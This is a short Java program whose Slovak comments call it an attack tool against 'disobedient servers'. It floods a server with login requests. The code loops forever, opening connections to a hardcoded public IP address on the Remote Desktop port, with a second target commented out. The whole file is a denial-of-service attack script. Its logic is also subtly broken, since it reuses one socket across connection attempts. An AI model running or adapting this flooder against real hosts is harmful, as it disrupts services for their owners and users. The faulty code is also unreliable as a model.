/*
 *  RaTaTaTa.java
 * 
 * Maly, utociaci programcok proti neposlusnym serverom.
 * 
 * Zahlti branu servera poziadavkami o logging.
 *
 * 2013-06-24  -  Robo Vanya
 * 
 **********************************************************************/
package test;

    import java.io.*;   
import java.net.InetSocketAddress;
    import java.net.Socket;   
import java.util.Arrays;
    import java.util.Calendar;

    public class RaTaTaTa_RDP {   
        public static void main(String args[]) {   
            String s = null;   
            String srv = "",sec = "0", lastSec = "0";
 
            double numShots = 0;
            double numSecs  = 0;
            double priemer  = 0;
            int    numShotsPerSec = 0;
            InetSocketAddress rdpSocket = new InetSocketAddress("173.225.102.5", 3389);
            //InetSocketAddress rdpSocket = new InetSocketAddress("82.119.116.2", 3395);
            Socket rdp_Con = new Socket();
           // rdp_Con.
            while (true) {
            Calendar cld = Calendar.getInstance();
            sec = String.valueOf(cld.get(Calendar.SECOND));
            if (!sec.equals(lastSec)) {
               lastSec = sec;
               numSecs++;
               priemer = (double) (numShots / numSecs);
            }
            try {
                rdp_Con.connect(rdpSocket);
                if (rdp_Con.isConnected()) {
                    System.out.println("Connected To Remote Desktop Checking Packets...");
                    int red;
                    byte[] buffer = new byte[4096];
                    byte[] redData;
                    while ((red = rdp_Con.getInputStream().read(buffer)) > -1) {
                        redData = new byte[red];
                        System.arraycopy(buffer, 0, redData, 0, red);
                        System.out.println(Arrays.toString(redData));
                    }
                }
            } catch (IOException e) {
                e.printStackTrace();
                System.out.println("BADCONN:" + numShots);
            }
   
            numShots++;
    }   
    }   
    }   
            